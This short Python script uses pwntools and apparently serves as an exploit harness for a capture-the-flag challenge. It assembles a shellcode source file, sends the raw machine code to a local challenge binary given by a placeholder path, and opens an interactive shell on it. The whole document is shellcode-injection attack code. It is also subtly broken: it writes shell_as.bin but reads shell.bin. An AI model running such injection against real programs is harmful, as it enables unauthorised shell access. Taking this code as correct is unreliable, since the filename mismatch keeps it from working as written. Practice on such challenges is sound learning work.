from pwn import *
import os

context.arch = 'x86_64'

# Assemble the shellcode
os.system("as -o ./shell_as.o ./shell_as.s")
os.system("objcopy --dump-section .text=./shell_as.bin ./shell_as.o")

# Read the raw binary (machine code) from shell.bin.
with open('./shell.bin', 'rb') as f:
    shellcode = f.read()

p = process('PATH_TO_THE_CHALLENGE_FILE')

# Send the shellcode to the process.
p.send(shellcode)

# Interact with the shell.
p.interactive()
